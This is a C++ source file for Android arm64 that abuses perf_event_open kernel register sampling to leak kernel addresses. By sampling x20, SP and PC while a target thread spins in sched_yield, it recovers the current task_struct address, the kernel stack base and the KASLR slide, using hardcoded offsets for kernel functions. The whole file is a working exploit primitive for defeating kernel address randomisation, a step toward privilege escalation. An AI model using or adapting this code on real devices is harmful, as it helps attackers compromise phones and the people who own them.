//
// leak_probe.cpp — perf_event_open register sampler.
//   exclude_user=1  -> only kernel cycles are sampled
//   sample_regs_intr = x20 | SP | PC
//     x20 holds `current` along the sched_yield path -> the task_struct
//     SP identifies the kernel stack base
//     PC votes on the KASLR slide (spinner-path functions, 2MB aligned)
// The caller must keep `tid` spinning in the kernel for the duration.
//
#include "leak_probe.h"

#include <android/log.h>
#include <cerrno>
#include <cstring>
#include <syscall.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#include <linux/perf_event.h>

#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, "gl_leak", __VA_ARGS__)

std::atomic<bool> leak_ksp{false};

/* bit20 = x20, bit31 = SP, bit32 = PERF_REG_ARM64_PC */
static constexpr uint64_t REGS_WE_WANT =
        (1ULL << 20) | (1ULL << 31) | (1ULL << 32);

static long perf_event_open(struct perf_event_attr *hw, pid_t pid, int cpu,
                            int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, hw, pid, cpu, group_fd, flags);
}

/* KASLR vote histogram: every sampled PC casts one vote per candidate
 * function it might be inside; the true slide (2MB aligned, in the
 * 0xffffff80.. direct/text prefix) collects votes from many samples. */
static constexpr int KVH = 16;
static uint64_t kv_slide[KVH];
static unsigned kv_votes[KVH];
static void kv_reset(void) {
    memset(kv_slide, 0, sizeof(kv_slide));
    memset(kv_votes, 0, sizeof(kv_votes));
}
static void kv_add(uint64_t slide) {
    for (int j = 0; j < KVH; j++) {
        if (kv_slide[j] == slide) { kv_votes[j]++; return; }
        if (kv_slide[j] == 0) { kv_slide[j] = slide; kv_votes[j] = 1; return; }
    }
    int w = 0;
    for (int j = 1; j < KVH; j++) if (kv_votes[j] < kv_votes[w]) w = j;
    if (kv_votes[w] < 4) { kv_slide[w] = slide; kv_votes[w] = 1; }
}
static uint64_t kv_best(void) {
    int b = -1;
    for (int j = 0; j < KVH; j++)
        if (kv_votes[j] >= 8 && (b < 0 || kv_votes[j] > kv_votes[b])) b = j;
    return b < 0 ? 0 : kv_slide[b];
}

static constexpr int HIST = 8;
static constexpr int DATA_PAGES = 64;

static LeakResult sample_pass(int fd, int tid) {
    (void) tid;
    LeakResult out{0, 0, 0, 0, 0};
    long pg = sysconf(_SC_PAGESIZE);
    size_t dsz = (size_t) pg * DATA_PAGES;
    unsigned char *m = (unsigned char *) mmap(
            nullptr, (size_t) pg + dsz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (m == MAP_FAILED) {
        LOGI("perf mmap errno=%d", errno);
        out.perf_errno = errno;
        return out;
    }
    auto *meta = (struct perf_event_mmap_page *) m;
    unsigned char *data = m + pg;

    uint64_t hv[HIST] = {0}, hc[HIST] = {0};
    uint64_t sp_hist[HIST] = {0}, sp_count[HIST] = {0};
    uint64_t tail = 0;
    kv_reset();

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);

    /* Drain while the target still spins: the ring holds only a few
     * thousand records at this size. */
    for (int round = 0; round < 60; round++) {
        usleep(20000);
        __sync_synchronize();
        uint64_t head = meta->data_head;
        __sync_synchronize();
        while (tail < head) {
            size_t off = (size_t) (tail % dsz);
            if (off + sizeof(struct perf_event_header) > dsz) {
                /* header straddles the ring end: skip to the next wrap */
                tail += dsz - off;
                continue;
            }
            auto *eh = (struct perf_event_header *) (data + off);
            if (eh->size < sizeof(*eh) || eh->size > dsz) break;
            if (off + eh->size > dsz) {
                /* record straddles: the kernel never wraps a record, so
                 * this only happens exactly at the boundary -- skip */
                tail += dsz - off;
                continue;
            }
            if (eh->type == PERF_RECORD_SAMPLE) {
                /* layout: header | ip | abi | regs... Bounds-check: some
                 * records (short ones) carry fewer regs than we read and
                 * the unpadded tail read was the intermittent SIGSEGV. */
                size_t regs_off = sizeof(*eh) + 16;
                if (regs_off + 24 > eh->size) {
                    tail += eh->size;
                    continue;
                }
                uint64_t *r = (uint64_t *) ((unsigned char *) eh + regs_off);
                uint64_t x20 = r[0], sp = r[1], pc = r[2];
                out.samples++;
                if (out.samples <= 12)
                    LOGI("sample[%lu] x20=%016llx sp=%016llx pc=%016llx",
                         out.samples, (unsigned long long) x20,
                         (unsigned long long) sp, (unsigned long long) pc);
                /* kernel VAs are 0xffffffXX.... */
                bool ksp = (sp & 0xffffff0000000000ULL) == 0xffffff0000000000ULL;
                if (ksp) {
                    uint64_t base = sp & ~(uint64_t) 0x3fff;
                    int s = -1;
                    for (int j = 0; j < HIST; j++) {
                        if (sp_hist[j] == base) { s = j; break; }
                        if (s < 0 && sp_hist[j] == 0) s = j;
                    }
                    if (s >= 0) { sp_hist[s] = base; sp_count[s]++; }
                }
                if (ksp && (x20 >> 40) == 0xffffffULL && (x20 & 0x3f) == 0) {
                    int s = -1;
                    for (int j = 0; j < HIST; j++) {
                        if (hv[j] == x20) { s = j; break; }
                        if (s < 0 && hv[j] == 0) s = j;
                    }
                    if (s >= 0) { hv[s] = x20; hc[s]++; }
                }
                /* KASLR vote: only the function CONTAINING pc votes (a
                 * naive pc-minus-every-candidate vote cancels itself out
                 * -- every sample voted for all candidates equally). */
                static const struct { uint64_t s, e; } kfuncs[] = {
                    {0x10e098ULL, 0x10e0b8ULL},  /* __arm64_sys_sched_yield */
                    {0x10e0b8ULL, 0x10e238ULL},  /* do_sched_yield */
                    {0xff50a4ULL, 0xff5b48ULL},  /* __schedule */
                    {0xff5cb8ULL, 0xff5d08ULL},  /* preempt_schedule_common */
                    {0x1aae10ULL, 0x1aaf00ULL},  /* hrtimer_nanosleep */
                };
                if ((pc >> 40) == 0xffffffULL) {
                    /* containment must be evaluated at the (2MB-aligned)
                     * slide itself: pc in [kf.s+S, kf.e+S) with
                     * S = pcblock - kfblock. rel is then the in-function
                     * offset, which must be < size. */
                    uint64_t pc2m = pc & ~(uint64_t) 0x1fffffULL;
                    for (auto &kf : kfuncs) {
                        uint64_t s2m = kf.s & ~(uint64_t) 0x1fffffULL;
                        if (pc2m < s2m) continue;
                        uint64_t slide = pc2m - s2m;
                        uint64_t rel = pc - (kf.s + slide);
                        if (rel < (kf.e - kf.s)) {
                            kv_add(slide);
                            break;
                        }
                    }
                }
            }
            tail += eh->size;
        }
        meta->data_tail = tail;
    }

    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    /* winners: the most frequent kernel x20 = the task_struct */
    int best = -1;
    for (int j = 0; j < HIST; j++) {
        if (!hc[j]) continue;
        if (best < 0 || hc[j] > hc[best]) best = j;
    }
    if (best >= 0) out.task_addr = hv[best];
    int sbest = -1;
    for (int j = 0; j < HIST; j++) {
        if (!sp_count[j]) continue;
        if (sbest < 0 || sp_count[j] > sp_count[sbest]) sbest = j;
    }
    if (sbest >= 0) out.stack_base = sp_hist[sbest];
    out.kaslr_base = kv_best();

    munmap(m, (size_t) pg + dsz);
    return out;
}

bool perf_open_works(void) {
    struct perf_event_attr a;
    memset(&a, 0, sizeof(a));
    a.size = sizeof(a);
    a.type = PERF_TYPE_SOFTWARE;
    a.config = PERF_COUNT_SW_CPU_CLOCK;
    a.disabled = 1;
    a.exclude_kernel = 1;
    int fd = (int) perf_event_open(&a, 0, -1, -1, 0);
    if (fd < 0) return false;
    close(fd);
    return true;
}

LeakResult leak_from_tid(int tid) {
    LeakResult out{0, 0, 0, 0, 0};
    struct perf_event_attr a;
    memset(&a, 0, sizeof(a));
    a.size = sizeof(a);
    a.type = PERF_TYPE_SOFTWARE;
    a.config = PERF_COUNT_SW_CPU_CLOCK;
    a.disabled = 1;
    a.exclude_user = 1;             /* kernel cycles only */
    a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
    a.sample_regs_intr = REGS_WE_WANT;
    a.sample_period = 4000;

    int fd = (int) perf_event_open(&a, tid, -1, -1, 0);
    if (fd < 0) {
        LOGI("perf_event_open errno=%d", errno);
        out.perf_errno = errno;
        return out;
    }
    out = sample_pass(fd, tid);
    close(fd);
    return out;
}
